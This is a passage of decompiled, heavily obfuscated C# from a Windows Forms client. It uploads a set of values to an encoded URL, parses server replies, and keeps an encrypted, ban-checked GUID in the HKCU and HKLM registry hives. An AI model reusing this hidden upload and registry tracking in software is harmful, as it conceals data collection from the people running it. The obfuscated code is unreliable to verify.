			nameValueCollection[<Module>.DeserealizeFromByteArrayV2_1<string>(2157954058U)] = text34;
			nameValueCollection[<Module>.DeserializeFromByteArrayV2<string>(515729066U)] = text35;
			nameValueCollection[<Module>.DeserializeFromByteArrayV2<string>(2507057196U)] = text36;
			nameValueCollection[<Module>.DeserializeFromByteArrayV2<string>(3651382582U)] = text37;
			nameValueCollection[<Module>.DeserializeFromByteArray<string>(1412623516U)] = text38;
			nameValueCollection[<Module>.DeserealizeFromByteArrayV2_1<string>(2553324076U)] = text25;
			nameValueCollection[<Module>.DeserealizeFromByteArrayV2_1<string>(1470938542U)] = text42;
			nameValueCollection[<Module>.DeserealizeFromByteArrayV2_1<string>(1831733720U)] = text39;
			nameValueCollection[<Module>.DeserializeFromByteArray<string>(1956642676U)] = text40;
			nameValueCollection[<Module>.DeserealizeFromByteArrayV2_1<string>(1110143364U)] = text45;
			nameValueCollection[<Module>.DeserializeFromByteArray<string>(81168608U)] = text46;
			nameValueCollection[<Module>.DeserializeFromByteArray<string>(3438398870U)] = text41;
			gclass.UploadValuesCompleted += this.HandleUploadCompletion;
			gclass.UploadProgressChanged += this.HandleUploadProgress;
			gclass.UploadValuesAsync(new Uri(Class12.smethod_2(Class12.Boolean_0, <Module>.DeserializeFromByteArray3<string>(3328382943U))), <Module>.DeserializeFromByteArray<string>(2371617216U), nameValueCollection);
		}
		catch
		{
			MAIN.Class31 @class = new MAIN.Class31();
			@class.gform0_0 = this;
			@class.string_0 = DateTime.Now.ToString(Class15.string_0, CultureInfo.InvariantCulture);
			base.Invoke(new MethodInvoker(@class.UpdateFormAndShowMessage));
		}
	}

	// Token: 0x06000648 RID: 1608
	private void HandleUploadProgress(object sender, UploadProgressChangedEventArgs e)
	{
		MAIN.Class32 @class = new MAIN.Class32();
		@class.uploadProgressChangedEventArgs_0 = e;
		@class.gform0_0 = this;
		base.Invoke(new MethodInvoker(@class.method_0));
	}

	// Token: 0x06000649 RID: 1609
	private void HandleUploadCompletion(object sender, UploadValuesCompletedEventArgs e)
	{
		MAIN.Class33 @class = new MAIN.Class33();
		@class.gform0_0 = this;
		@class.uploadValuesCompletedEventArgs_0 = e;
		@class.string_0 = DateTime.Now.ToString(Class15.string_0, CultureInfo.InvariantCulture);
		if (@class.uploadValuesCompletedEventArgs_0.Error != null)
		{
			if (@class.uploadValuesCompletedEventArgs_0.Error is CryptographicException)
			{
				base.Invoke(new MethodInvoker(@class.method_6));
				return;
			}
			MAIN.Class39 class2 = new MAIN.Class39();
			class2.class33_0 = @class;
			class2.httpWebResponse_0 = GClass56.smethod_0(class2.class33_0.uploadValuesCompletedEventArgs_0.Error);
			base.Invoke(new MethodInvoker(class2.method_0));
		}
		else
		{
			if (@class.uploadValuesCompletedEventArgs_0.Result == null)
			{
				base.Invoke(new MethodInvoker(@class.method_5));
				return;
			}
			string @string = Encoding.UTF8.GetString(@class.uploadValuesCompletedEventArgs_0.Result);
			if (!@string.Contains(Class14.String_202))
			{
				if (!@string.Contains(Class14.String_183))
				{
					if (@string.Contains(Class14.String_78))
					{
						base.Invoke(new MethodInvoker(@class.method_2));
						int num = @string.IndexOf(Class14.String_78);
						if (num != -1)
						{
							int num2 = @string.IndexOf(<Module>.DeserializeFromByteArray<string>(1433880182U));
							if (num2 != -1)
							{
								MAIN.Class37 class3 = new MAIN.Class37();
								class3.class33_0 = @class;
								class3.string_0 = @string.Substring(num + 7, num2 - 7 - num);
								base.Invoke(new MethodInvoker(class3.method_0));
								return;
							}
						}
					}
					else
					{
						if (!@string.Contains(Class14.String_97))
						{
							base.Invoke(new MethodInvoker(@class.method_4));
							return;
						}
						base.Invoke(new MethodInvoker(@class.method_3));
						int num3 = @string.IndexOf(Class14.String_97);
						if (num3 != -1)
						{
							int num4 = @string.IndexOf(<Module>.DeserealizeFromByteArrayV2_1<string>(2281206640U));
							if (num4 != -1)
							{
								MAIN.Class38 class4 = new MAIN.Class38();
								class4.class33_0 = @class;
								class4.string_0 = @string.Substring(num3 + 6, num4 - 6 - num3);
								base.Invoke(new MethodInvoker(class4.method_0));
								return;
							}
						}
					}
				}
				else
				{
					base.Invoke(new MethodInvoker(@class.method_1));
					int num5 = @string.IndexOf(Class14.String_183);
					if (num5 != -1)
					{
						int num6 = @string.IndexOf(<Module>.DeserealizeFromByteArrayV2_1<string>(2281206640U));
						if (num6 != -1)
						{
							MAIN.Class36 class5 = new MAIN.Class36();
							class5.class33_0 = @class;
							class5.string_0 = @string.Substring(num5 + 4, num6 - 4 - num5);
							base.Invoke(new MethodInvoker(class5.method_0));
							return;
						}
					}
				}
			}
			else
			{
				bool flag = true;
				int num7 = @string.IndexOf(Class14.String_202);
				if (num7 != -1)
				{
					int num8 = @string.IndexOf(<Module>.DeserializeFromByteArray<string>(1094056285U));
					if (num8 != -1)
					{
						MAIN.Class34 class6 = new MAIN.Class34();
						class6.class33_0 = @class;
						class6.string_0 = @string.Substring(num7 + 3, num8 - 3 - num7);
						class6.string_0 = Class12.smethod_3(true, Convert.ToInt64(class6.string_0));
						num7 = @string.IndexOf(<Module>.DeserializeFromByteArray3<string>(1793103161U));
						if (num7 != -1)
						{
							MAIN.Class35 class7 = new MAIN.Class35();
							class7.class34_0 = class6;
							class7.string_0 = @string.Substring(num8 + 1, num7 - num8 - 1);
							flag = false;
							base.Invoke(new MethodInvoker(class7.method_0));
						}
					}
				}
				if (flag)
				{
					base.Invoke(new MethodInvoker(@class.method_0));
					return;
				}
			}
		}
	}

	// Token: 0x0600064A RID: 1610 RVA: 0x00064F10 File Offset: 0x00063110
	private void GForm0_Load(object sender, EventArgs e)
	{
		this.SetLabelFonts();
		this.string_0 = DateTime.Now.ToString(Class15.string_0, CultureInfo.InvariantCulture);
		try
		{
			this.gclass43_0.method_0();
			this.bool_0 = true;
		}
		catch
		{
			this.bool_0 = false;
		}
	}

	// Token: 0x0600064B RID: 1611
	private void GenerateGuid()
	{
		if (this.string_2 == null || this.string_2 == string.Empty || this.string_2.Length == 0)
		{
			this.string_2 = Guid.NewGuid().ToString(<Module>.DeserealizeFromByteArrayV2_1<string>(1221391273U)).ToUpper();
			this.byte_0 = this.EncryptString(this.string_2);
		}
	}

	// Token: 0x0600064C RID: 1612
	private bool CheckRegKeyDetect()
	{
		bool flag = RegistryStuff.UpdateRegKey(Registry.CurrentUser, <Module>.DeserializeFromByteArrayV2<string>(3569104898U), <Module>.DeserializeFromByteArray3<string>(3670965012U), this.string_2, true);
		bool flag2 = RegistryStuff.UpdateRegistryKeyBinary(Registry.LocalMachine, <Module>.DeserializeFromByteArray3<string>(2116877045U), <Module>.DeserializeFromByteArray<string>(2575812479U), this.byte_0, true);
		return flag && flag2;
	}

	// Token: 0x0600064D RID: 1613
	private byte[] EncryptString(string string_6)
	{
		if (string_6 != null && string_6.Length != 0)
		{
			try
			{
				string_6 = string_6.ToUpper();
				byte[] array = Class13.GenerateRandomBytes(32);
				byte[] array2 = Convert.FromBase64String(Class13.EncryptToBase64String(string_6, array, MAIN.byte_1));
				byte[] array3 = new byte[array.Length + array2.Length];
				Array.Copy(array, 0, array3, 0, array.Length);
				Array.Copy(array2, 0, array3, array.Length, array2.Length);
				return array3;
			}
			catch
			{
			}
			return null;
		}
		return null;
	}

	// Token: 0x0600064E RID: 1614
	private string EncryptByteArrayToBase64(byte[] byte_2)
	{
		if (byte_2 != null && byte_2.Length != 0)
		{
			try
			{
				byte b = 32;
				if (32 < byte_2.Length)
				{
					byte[] array = new byte[(int)b];
					Array.Copy(byte_2, 0, array, 0, (int)b);
					byte[] array2 = new byte[byte_2.Length - (int)b];
					Array.Copy(byte_2, array.Length, array2, 0, array2.Length);
					return Class13.EncryptStringToBase64(Convert.ToBase64String(array2), array, MAIN.byte_1);
				}
				return null;
			}
			catch
			{
			}
			return null;
		}
		return null;
	}

	// Token: 0x0600064F RID: 1615
	private bool IsGuidBanned()
	{
		bool result = false;
		try
		{
			this.string_2 = RegistryStuff.GetStringValueFromRegistry(Registry.CurrentUser, <Module>.DeserealizeFromByteArrayV2_1<string>(1193391884U), <Module>.DeserializeFromByteArray<string>(3513549513U));
			if (this.string_2 != null)
			{
				this.string_2 = this.string_2.ToUpper();
				if (Class15.ValidateGuidString(this.string_2))
				{
					this.byte_0 = RegistryStuff.GetByteArrayFromRegistry(Registry.LocalMachine, <Module>.DeserializeFromByteArray2<string>(3268612149U), <Module>.DeserializeFromByteArray<string>(2575812479U));
					bool flag = false;
					if (this.byte_0 == null)
					{
						flag = true;
					}
					else
					{
						string a = this.EncryptByteArrayToBase64(this.byte_0);
						if (!Class15.ValidateGuidString(a))
						{
							flag = true;
						}
						else if (a != this.string_2)
						{
							this.string_2 = a;
							result = this.CheckRegKeyDetect();
						}
					}
					if (!flag)
					{
						result = true;
					}
					else
					{
						this.byte_0 = this.EncryptString(this.string_2);
						result = this.CheckRegKeyDetect();
					}
				}
				else
				{
					this.byte_0 = RegistryStuff.GetByteArrayFromRegistry(Registry.LocalMachine, <Module>.DeserializeFromByteArray2<string>(3268612149U), <Module>.DeserealizeFromByteArrayV2_1<string>(499800917U));
					if (this.byte_0 != null)
					{
						string text = this.EncryptByteArrayToBase64(this.byte_0);
						if (Class15.ValidateGuidString(text))
						{
							this.string_2 = text;
							result = this.CheckRegKeyDetect();
						}
					}
				}
			}
			else
			{
				this.byte_0 = RegistryStuff.GetByteArrayFromRegistry(Registry.LocalMachine, <Module>.DeserializeFromByteArray3<string>(2116877045U), <Module>.DeserializeFromByteArray<string>(2575812479U));
				if (this.byte_0 != null)
				{
					string text2 = this.EncryptByteArrayToBase64(this.byte_0);
					if (!Class15.ValidateGuidString(text2))
					{
						this.GenerateGuid();
						result = this.CheckRegKeyDetect();
					}
					else
					{
						this.string_2 = text2;
						result = this.CheckRegKeyDetect();
					}
				}
				else
				{
					this.GenerateGuid();
					result = this.CheckRegKeyDetect();
				}
			}
			this.byte_0 = this.EncryptString(this.string_2);
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x06000650 RID: 1616 RVA: 0x0006531C File Offset: 0x0006351C
	private void GForm0_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			this.SafeSetBool();
			this.thread_0.Abort();
		}
		catch
		{
		}
		try
		{
			this.gclass43_0.method_1();
		}
		catch
		{
		}
	}

	// Token: 0x06000651 RID: 1617 RVA: 0x0006536C File Offset: 0x0006356C
	private void label_0_Click(object sender, EventArgs e)
	{
		Process.Start(Class12.smethod_1(true));
	}

	// Token: 0x06000652 RID: 1618 RVA: 0x00065388 File Offset: 0x00063588
	private void label_1_Click(object sender, EventArgs e)
	{
		MessageBox.Show(this, string.Concat(new string[]
		{
			<Module>.DeserealizeFromByteArrayV2_1<string>(860596095U),
			this.string_1,
			<Module>.DeserializeFromByteArray2<string>(4147557090U),
			Environment.NewLine,
			<Module>.DeserealizeFromByteArrayV2_1<string>(1075568524U),
			Environment.NewLine,
			<Module>.DeserealizeFromByteArrayV2_1<string>(173580579U),
			Environment.NewLine,
			<Module>.DeserializeFromByteArrayV2<string>(1622583467U),
			Class12.smethod_1(true),
			Environment.NewLine,
			<Module>.DeserializeFromByteArrayV2<string>(3918728436U),
			Class12.smethod_0(true),
			Environment.NewLine,
			Environment.NewLine,
			<Module>.DeserializeFromByteArrayV2<string>(1630077664U)
		}), <Module>.DeserializeFromByteArray2<string>(2080987057U), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
	}

	// Token: 0x06000653 RID: 1619
	[DllImport("gdi32.dll")]
	private static extern IntPtr AddFontMemResourceEx(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, [In] ref uint uint_1);

	// Token: 0x06000654 RID: 1620 RVA: 0x00065464 File Offset: 0x00063664
	private void SetCustomFonts()
	{
		byte[] array = Class43.Byte_0;
		int num = Class43.Byte_0.Length;
		IntPtr intPtr = Marshal.AllocCoTaskMem(num);
		Marshal.Copy(array, 0, intPtr, num);
		uint num2 = 0U;
		MAIN.AddFontMemResourceEx(intPtr, (uint)array.Length, IntPtr.Zero, ref num2);
		PrivateFontCollection privateFontCollection = new PrivateFontCollection();
		privateFontCollection.AddMemoryFont(intPtr, num);
		this.fontFamily_0 = privateFontCollection.Families[0];
		this.font_0 = new Font(this.fontFamily_0, 15f, FontStyle.Regular);
	}

	// Token: 0x06000655 RID: 1621 RVA: 0x000654D8 File Offset: 0x000636D8
	private void SetLabelFonts()
	{
		try
		{
			this.SetCustomFonts();
			this.label_0.Font = new Font(this.fontFamily_0, 9f, FontStyle.Regular);
			this.label_1.Font = new Font(this.fontFamily_0, 9f, FontStyle.Regular);
			this.label_2.Font = new Font(this.fontFamily_0, 9f, FontStyle.Regular);
			this.label_3.Font = new Font(this.fontFamily_0, 9f, FontStyle.Regular);
		}
		catch
		{
			this.label_0.Font = new Font(<Module>.DeserializeFromByteArrayV2<string>(3049243101U), this.label_0.Font.Size, FontStyle.Bold);
			this.label_1.Font = new Font(<Module>.DeserializeFromByteArrayV2<string>(3049243101U), this.label_0.Font.Size, FontStyle.Bold);
			this.label_2.Font = new Font(<Module>.DeserializeFromByteArrayV2<string>(3049243101U), this.label_0.Font.Size, FontStyle.Bold);
			this.label_3.Font = new Font(<Module>.DeserializeFromByteArray2<string>(2871603648U), this.label_0.Font.Size, FontStyle.Bold);
		}
	}

	// Token: 0x06000656 RID: 1622 RVA: 0x00065620 File Offset: 0x00063820
	protected virtual void Dispose(bool disposing)
	{
		if (disposing && this.icontainer_0 != null)
		{
			this.icontainer_0.Dispose();
		}
		base.Dispose(disposing);
	}

	// Token: 0x06000657 RID: 1623 RVA: 0x0006564C File Offset: 0x0006384C
	private void InitUIComponents()
	{
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MAIN));
		this.button_0 = new Button();
		this.button_1 = new Button();
		this.label_0 = new Label();
		this.label_1 = new Label();
		this.label_2 = new Label();
		this.label_3 = new Label();
		base.SuspendLayout();
		this.button_0.BackColor = Color.Transparent;
		this.button_0.FlatAppearance.BorderColor = Color.Black;
		this.button_0.FlatAppearance.BorderSize = 0;
		this.button_0.FlatAppearance.MouseDownBackColor = Color.Black;
		this.button_0.FlatAppearance.MouseOverBackColor = Color.Black;
		this.button_0.FlatStyle = FlatStyle.Flat;
		this.button_0.Font = new Font(<Module>.DeserializeFromByteArray2<string>(3244015963U), 11.25f, FontStyle.Bold);
		this.button_0.ForeColor = Color.Transparent;
		this.button_0.Location = new Point(253, 129);
		this.button_0.Margin = new Padding(4, 4, 4, 4);
		this.button_0.Name = <Module>.DeserializeFromByteArray<string>(1076091626U);
		this.button_0.Size = new Size(124, 36);
		this.button_0.TabIndex = 2;
		this.button_0.Text = <Module>.DeserealizeFromByteArrayV2_1<string>(4184425766U);
		this.button_0.UseVisualStyleBackColor = false;
		this.button_0.Click += this.button_0_Click;
		this.button_1.BackColor = Color.Transparent;
		this.button_1.Enabled = false;
		this.button_1.FlatAppearance.BorderColor = Color.Black;
		this.button_1.FlatAppearance.BorderSize = 0;
		this.button_1.FlatAppearance.MouseDownBackColor = Color.Black;
		this.button_1.FlatAppearance.MouseOverBackColor = Color.Black;
		this.button_1.FlatStyle = FlatStyle.Flat;
		this.button_1.Font = new Font(<Module>.DeserializeFromByteArray2<string>(3244015963U), 11.25f, FontStyle.Bold, GraphicsUnit.Point, 238);
		this.button_1.ForeColor = Color.Transparent;
		this.button_1.Location = new Point(253, 172);
		this.button_1.Margin = new Padding(4, 4, 4, 4);
		this.button_1.Name = <Module>.DeserealizeFromByteArrayV2_1<string>(250253648U);
		this.button_1.Size = new Size(124, 36);
		this.button_1.TabIndex = 3;
		this.button_1.Text = <Module>.DeserealizeFromByteArrayV2_1<string>(3282437821U);
		this.button_1.UseVisualStyleBackColor = false;
		this.button_1.Click += this.button_1_Click;
		this.label_0.AutoSize = true;
		this.label_0.BackColor = Color.Transparent;
		this.label_0.Cursor = Cursors.Hand;
		this.label_0.Font = new Font(<Module>.DeserealizeFromByteArrayV2_1<string>(2741245054U), 8.999999f, FontStyle.Bold, GraphicsUnit.Point, 238);
		this.label_0.ForeColor = Color.White;
		this.label_0.Location = new Point(4, 284);
		this.label_0.Margin = new Padding(4, 0, 4, 0);
		this.label_0.Name = <Module>.DeserializeFromByteArray<string>(2632998463U);
		this.label_0.Size = new Size(161, 18);
		this.label_0.TabIndex = 6;
		this.label_0.Text = <Module>.DeserializeFromByteArray3<string>(3512365411U);
		this.label_0.Click += this.label_0_Click;
		this.label_1.AutoSize = true;
		this.label_1.BackColor = Color.Transparent;
		this.label_1.Cursor = Cursors.Hand;
		this.label_1.Font = new Font(<Module>.DeserializeFromByteArray<string>(682373752U), 8.999999f, FontStyle.Bold, GraphicsUnit.Point, 238);
		this.label_1.ForeColor = Color.White;
		this.label_1.Location = new Point(289, 284);
		this.label_1.Margin = new Padding(4, 0, 4, 0);
		this.label_1.Name = <Module>.DeserializeFromByteArray<string>(3645886140U);
		this.label_1.Size = new Size(88, 18);
		this.label_1.TabIndex = 5;
		this.label_1.Text = <Module>.DeserealizeFromByteArrayV2_1<string>(319403328U);
		this.label_1.Click += this.label_1_Click;
		this.label_2.AutoSize = true;
		this.label_2.BackColor = Color.Transparent;
		this.label_2.Cursor = Cursors.Arrow;
		this.label_2.Font = new Font(<Module>.DeserializeFromByteArray<string>(682373752U), 8.999999f, FontStyle.Bold, GraphicsUnit.Point, 238);
		this.label_2.ForeColor = Color.White;
		this.label_2.Location = new Point(4, 219);
		this.label_2.Margin = new Padding(4, 0, 4, 0);
		this.label_2.Name = <Module>.DeserializeFromByteArray3<string>(3854947480U);
		this.label_2.Size = new Size(100, 18);
		this.label_2.TabIndex = 7;
		this.label_2.Text = <Module>.DeserializeFromByteArrayV2<string>(203418030U);
		this.label_3.AutoSize = true;
		this.label_3.BackColor = Color.Transparent;
		this.label_3.Cursor = Cursors.Default;
		this.label_3.Font = new Font(<Module>.DeserealizeFromByteArrayV2_1<string>(2741245054U), 8.999999f, FontStyle.Bold, GraphicsUnit.Point, 238);
		this.label_3.ForeColor = Color.White;
		this.label_3.Location = new Point(4, 241);
		this.label_3.Margin = new Padding(4, 0, 4, 0);
		this.label_3.Name = <Module>.DeserializeFromByteArray2<string>(2035195096U);
		this.label_3.Size = new Size(118, 18);
		this.label_3.TabIndex = 8;
		this.label_3.Text = <Module>.DeserializeFromByteArray2<string>(20493651U);
		base.AutoScaleDimensions = new SizeF(8f, 16f);
		base.AutoScaleMode = AutoScaleMode.Font;
		this.BackColor = Color.Black;
		this.BackgroundImage = Class43.Bitmap_0;
		this.BackgroundImageLayout = ImageLayout.Stretch;
		base.ClientSize = new Size(393, 313);
		base.Controls.Add(this.label_1);
		base.Controls.Add(this.label_0);
		base.Controls.Add(this.label_3);
		base.Controls.Add(this.label_2);
		base.Controls.Add(this.button_1);
		base.Controls.Add(this.button_0);
		this.DoubleBuffered = true;
		base.FormBorderStyle = FormBorderStyle.FixedSingle;
		base.Icon = (Icon)componentResourceManager.GetObject(<Module>.DeserealizeFromByteArrayV2_1<string>(922222386U));
		base.Margin = new Padding(4, 4, 4, 4);
		base.MaximizeBox = false;
		base.Name = <Module>.DeserializeFromByteArray2<string>(1571198859U);
		base.StartPosition = FormStartPosition.CenterScreen;
		this.Text = <Module>.DeserializeFromByteArrayV2<string>(3026760510U);
		base.FormClosing += this.GForm0_FormClosing;
		base.Load += this.GForm0_Load;
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	// Token: 0x06000659 RID: 1625 RVA: 0x00065E70 File Offset: 0x00064070
	[CompilerGenerated]
	private void EnableButton()
	{
		this.button_0.Enabled = false;
	}

	// Token: 0x0600065A RID: 1626
	[CompilerGenerated]
	private void UpdateButtonLabelState()
	{
		this.button_0.Enabled = true;
		this.button_0.Text = <Module>.DeserializeFromByteArrayV2<string>(4163591699U);
		this.label_3.Text = <Module>.DeserializeFromByteArray<string>(904533674U);
	}

	// Token: 0x0600065B RID: 1627
	[CompilerGenerated]
	private void EnableButtonAndUpdateText()
	{
		this.button_0.Enabled = true;
		this.button_0.Text = <Module>.DeserializeFromByteArrayV2<string>(4163591699U);
		this.label_3.Text = <Module>.DeserealizeFromByteArrayV2_1<string>(3739434130U);
	}

	// Token: 0x0600065C RID: 1628
	[CompilerGenerated]
	private void EnableButtonAndUpdateText2()
	{
		this.button_0.Enabled = true;
		this.button_0.Text = <Module>.DeserializeFromByteArray2<string>(811110242U);
		this.label_3.Text = <Module>.DeserializeFromByteArray3<string>(2928707988U);
	}

	// Token: 0x0600065D RID: 1629
	[CompilerGenerated]
	private void UpdateButtonTextLabel3()
	{
		this.button_0.Enabled = true;
		this.button_0.Text = <Module>.DeserializeFromByteArray3<string>(2484619204U);
		this.label_3.Text = <Module>.DeserealizeFromByteArrayV2_1<string>(3739434130U);
	}

	// Token: 0x0600065E RID: 1630
	[CompilerGenerated]
	private void ButtoNShitLabelText5()
	{
		this.button_0.Enabled = true;
		this.button_0.Text = <Module>.DeserializeFromByteArrayV2<string>(4163591699U);
		this.label_3.Text = <Module>.DeserializeFromByteArray<string>(1054834960U);
	}

	// Token: 0x0600065F RID: 1631
	[CompilerGenerated]
	private void UpdateBullshitButtonTextLabel()
	{
		this.button_0.Enabled = true;
		this.button_0.Text = <Module>.DeserializeFromByteArray2<string>(2407607411U);
		this.label_3.Text = <Module>.DeserializeFromByteArrayV2<string>(4178580093U);
	}

	// Token: 0x06000660 RID: 1632
	[CompilerGenerated]
	private void UpdateButtonTextLabel8millionomgSTOPTHISSSSSSS()
	{
		this.button_0.Enabled = true;
		this.button_0.Text = <Module>.DeserializeFromByteArray<string>(2311139225U);
		this.label_3.Text = <Module>.DeserealizeFromByteArrayV2_1<string>(2726198276U);
	}

	// Token: 0x06000661 RID: 1633
	[CompilerGenerated]
	private void UpdateProgressLabel()
	{
		this.label_3.Text = string.Format(<Module>.DeserealizeFromByteArrayV2_1<string>(1970033080U), this.int_0 * 100 / this.int_1);
	}

	// Token: 0x06000662 RID: 1634
	[CompilerGenerated]
	private void SetStatusLabelToDefaultText()
	{
		this.label_3.Text = <Module>.DeserializeFromByteArray2<string>(3836200723U);
	}

	// Token: 0x06000663 RID: 1635
	[CompilerGenerated]
	private void BullshitButtonText39million()
	{
		this.label_3.Text = <Module>.DeserializeFromByteArrayV2<string>(4141109108U);
		this.button_0.Enabled = true;
	}

	// Token: 0x06000664 RID: 1636
	[CompilerGenerated]
	private void AnotherFuckingButton()
	{
		this.label_3.Text = <Module>.DeserializeFromByteArrayV2<string>(2424621029U);
		this.button_0.Enabled = true;
	}

	// Token: 0x06000665 RID: 1637
	[CompilerGenerated]
	private void SetLabelToDefaultText()
	{
		this.label_3.Text = <Module>.DeserializeFromByteArray2<string>(3076112106U);
	}

	// Token: 0x04000947 RID: 2375
	private Thread thread_0;

	// Token: 0x04000948 RID: 2376
	private GClass51 gclass51_0;

	// Token: 0x04000949 RID: 2377
	private Process process_0;

	// Token: 0x0400094A RID: 2378
	private GClass43 gclass43_0;

	// Token: 0x0400094B RID: 2379
	private bool bool_0;

	// Token: 0x0400094C RID: 2380
	private string string_0;

	// Token: 0x0400094D RID: 2381
	private string string_1 = Application.ProductVersion;

	// Token: 0x0400094E RID: 2382
	private string string_2;

	// Token: 0x0400094F RID: 2383
	private byte[] byte_0;

	// Token: 0x04000950 RID: 2384
	private string string_3 = string.Empty;

	// Token: 0x04000951 RID: 2385
	private bool bool_1;

	// Token: 0x04000952 RID: 2386
	private int int_0;

	// Token: 0x04000953 RID: 2387
	private int int_1 = 34;

	// Token: 0x04000954 RID: 2388
	private static object object_0 = new object();

	// Token: 0x04000955 RID: 2389
	private static object object_1 = new object();

	// Token: 0x04000956 RID: 2390
	private static object object_2 = new object();

	// Token: 0x04000957 RID: 2391
	private static object object_3 = new object();

	// Token: 0x04000958 RID: 2392
	private string string_4;

	// Token: 0x04000959 RID: 2393
	private bool bool_2;

	// Token: 0x0400095A RID: 2394
	private string string_5 = string.Empty;

	// Token: 0x0400095B RID: 2395
	private object object_4 = new object();

	// Token: 0x0400095C RID: 2396
	private object object_5 = new object();

	// Token: 0x0400095D RID: 2397
	private static readonly Regex regex_0 = new Regex(<Module>.DeserializeFromByteArray3<string>(3835916518U), RegexOptions.IgnoreCase | RegexOptions.Singleline);

	// Token: 0x0400095E RID: 2398
	private static byte[] byte_1 = new byte[]
	{
		167,
		0,
		79,
		138,
		238,
		156,
		34,
		179,
		52,
		160,
		121,
		246,
		17,
		170,
		36,
		116
	};

	// Token: 0x0400095F RID: 2399
	private FontFamily fontFamily_0;

	// Token: 0x04000960 RID: 2400
	private Font font_0;

	// Token: 0x04000961 RID: 2401
	private IContainer icontainer_0;

	// Token: 0x04000962 RID: 2402
	private Button button_0;

	// Token: 0x04000963 RID: 2403
	private Button button_1;

	// Token: 0x04000964 RID: 2404
	private Label label_0;

	// Token: 0x04000965 RID: 2405
	private Label label_1;

	// Token: 0x04000966 RID: 2406
	private Label label_2;

	// Token: 0x04000967 RID: 2407
	private Label label_3;

	// Token: 0x020000BB RID: 187
	private class Class17
	{
		// Token: 0x170002D3 RID: 723
		// (get) Token: 0x06000666 RID: 1638 RVA: 0x0006614C File Offset: 0x0006434C
		// (set) Token: 0x06000667 RID: 1639 RVA: 0x00066160 File Offset: 0x00064360
		public string String_0 { get; set; }

		// Token: 0x170002D4 RID: 724
		// (get) Token: 0x06000668 RID: 1640 RVA: 0x00066174 File Offset: 0x00064374
		// (set) Token: 0x06000669 RID: 1641 RVA: 0x00066188 File Offset: 0x00064388
		public string String_1 { get; set; }

		// Token: 0x170002D5 RID: 725
		// (get) Token: 0x0600066A RID: 1642 RVA: 0x0006619C File Offset: 0x0006439C
		// (set) Token: 0x0600066B RID: 1643 RVA: 0x000661B0 File Offset: 0x000643B0
		public string String_2 { get; set; }

		// Token: 0x170002D6 RID: 726
		// (get) Token: 0x0600066C RID: 1644 RVA: 0x000661C4 File Offset: 0x000643C4
		// (set) Token: 0x0600066D RID: 1645 RVA: 0x000661D8 File Offset: 0x000643D8
		public string String_3 { get; set; }

		// Token: 0x170002D7 RID: 727
		// (get) Token: 0x0600066E RID: 1646 RVA: 0x000661EC File Offset: 0x000643EC
		// (set) Token: 0x0600066F RID: 1647 RVA: 0x00066200 File Offset: 0x00064400
		public string String_4 { get; set; }

		// Token: 0x04000968 RID: 2408
		[CompilerGenerated]
		private string string_0;

		// Token: 0x04000969 RID: 2409
		[CompilerGenerated]
		private string string_1;

		// Token: 0x0400096A RID: 2410
		[CompilerGenerated]
		private string string_2;

		// Token: 0x0400096B RID: 2411
		[CompilerGenerated]
		private string string_3;

		// Token: 0x0400096C RID: 2412
		[CompilerGenerated]
		private string string_4;
	}

	// Token: 0x020000BC RID: 188
	private class Class18
	{
		// Token: 0x170002D8 RID: 728
		// (get) Token: 0x06000671 RID: 1649 RVA: 0x00066214 File Offset: 0x00064414
		// (set) Token: 0x06000672 RID: 1650 RVA: 0x00066228 File Offset: 0x00064428
		public string String_0 { get; private set; }

		// Token: 0x170002D9 RID: 729
		// (get) Token: 0x06000673 RID: 1651 RVA: 0x0006623C File Offset: 0x0006443C
		// (set) Token: 0x06000674 RID: 1652 RVA: 0x00066250 File Offset: 0x00064450
		public IntPtr IntPtr_0 { get; private set; }

		// Token: 0x170002DA RID: 730
		// (get) Token: 0x06000675 RID: 1653 RVA: 0x00066264 File Offset: 0x00064464
		// (set) Token: 0x06000676 RID: 1654 RVA: 0x00066278 File Offset: 0x00064478
		public IntPtr IntPtr_1 { get; private set; }

		// Token: 0x06000677 RID: 1655 RVA: 0x0006628C File Offset: 0x0006448C
		public Class18(string string_1, IntPtr intptr_2, IntPtr intptr_3)
		{
			this.String_0 = string_1;
			this.IntPtr_0 = intptr_2;
			this.IntPtr_1 = intptr_3;
		}

		// Token: 0x06000678 RID: 1656 RVA: 0x000662B4 File Offset: 0x000644B4
		public virtual string ToString()
		{
			return string.Format(<Module>.DeserealizeFromByteArrayV2_1<string>(492277528U), new object[]
			{
				Class15.SanitizeString(this.String_0),
				Class15.char_1,
				this.IntPtr_0.ToString(<Module>.DeserializeFromByteArray<string>(2611176279U)),
				Class15.char_1,
				this.IntPtr_1.ToString(<Module>.DeserializeFromByteArray3<string>(4115400338U)),
				Class15.char_1
			});
		}

		// Token: 0x06000679 RID: 1657 RVA: 0x00066344 File Offset: 0x00064544
		public static MAIN.Class18 smethod_0(List<MAIN.Class18> list_0, string string_1)
		{
			string b = string_1.ToLowerInvariant();
			using (List<MAIN.Class18>.Enumerator enumerator = list_0.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					MAIN.Class18 @class = enumerator.Current;
					if (@class.String_0.ToLowerInvariant() == b)
					{
						return @class;
					}
				}
				goto IL_4B;
			}
			MAIN.Class18 result;
			return result;
			IL_4B:
			return null;
		}

		// Token: 0x0400096D RID: 2413
		[CompilerGenerated]
		private string string_0;

		// Token: 0x0400096E RID: 2414
		[CompilerGenerated]
		private IntPtr intptr_0;

		// Token: 0x0400096F RID: 2415
		[CompilerGenerated]
		private IntPtr intptr_1;
	}

	// Token: 0x020000BD RID: 189
	private class Class19
	{
		// Token: 0x170002DB RID: 731
		// (get) Token: 0x0600067A RID: 1658 RVA: 0x000663B0 File Offset: 0x000645B0
		// (set) Token: 0x0600067B RID: 1659 RVA: 0x000663C4 File Offset: 0x000645C4
		public int Int32_0 { get; private set; }

		// Token: 0x170002DC RID: 732
		// (get) Token: 0x0600067C RID: 1660 RVA: 0x000663D8 File Offset: 0x000645D8
		// (set) Token: 0x0600067D RID: 1661 RVA: 0x000663EC File Offset: 0x000645EC
		public TimeSpan TimeSpan_0 { get; private set; }

		// Token: 0x170002DD RID: 733
		// (get) Token: 0x0600067E RID: 1662 RVA: 0x00066400 File Offset: 0x00064600
